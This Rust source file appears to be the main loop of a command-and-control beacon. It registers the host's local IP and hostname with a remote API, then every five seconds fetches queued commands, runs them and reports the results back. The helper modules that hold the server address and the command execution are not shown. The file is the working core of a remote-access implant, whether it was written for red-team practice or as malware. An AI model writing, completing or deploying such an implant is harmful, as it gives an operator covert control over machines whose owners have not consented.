mod api;
mod command;

use crate::api::*;
use crate::command::*;
use local_ip_address::local_ip;
use std::net::IpAddr;
use std::{thread::sleep, time::Duration};

fn main() {
    let api: API = API::new();
    let ip: IpAddr = local_ip().unwrap();
    let hostname: String = String::from(hostname::get().unwrap().to_str().unwrap());
    let id: u32 = api.register_beacon(ip, hostname);
    println!("Beacon ID: {}", id);

    loop {
        let commands: Vec<Command> = api.get_beacon_commands(id, true);
        if commands.is_empty() {
            println!("No commands found");
            sleep(Duration::from_secs(5));
            continue;
        }

        for mut command in commands {
            println!("{}", serde_json::to_string(&command).unwrap());
            command.run();
            println!("{}", command.result);
            api.mark_command_executed(&command);
        }
        sleep(Duration::from_secs(5));
    }
}
